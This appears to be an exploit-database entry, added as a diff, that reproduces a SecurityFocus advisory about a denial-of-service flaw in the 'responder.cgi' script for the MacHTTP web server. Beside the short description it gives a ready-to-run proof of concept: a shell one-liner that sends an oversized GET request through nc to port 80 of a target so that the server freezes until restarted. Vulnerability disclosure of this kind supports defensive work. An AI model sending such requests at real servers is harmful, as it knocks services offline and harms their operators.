@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/3155/info
+
+responder.cgi' is a free CGI shell script, written in C, for MacHTTP Server and other MacOS webserver products.
+
+It is possible to cause a denial of service to MacHTTP webserver due to improper bounds checking in the script 'responder.cgi'. HTTP GET requests with an excessive number of characters will cause the server to freeze.
+
+The webserver will need to be restarted to regain normal functionality. 
+
+$ echo "GET
+/cgi-bin/responder.cgi?xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" | nc
+machttp-server.com 80 
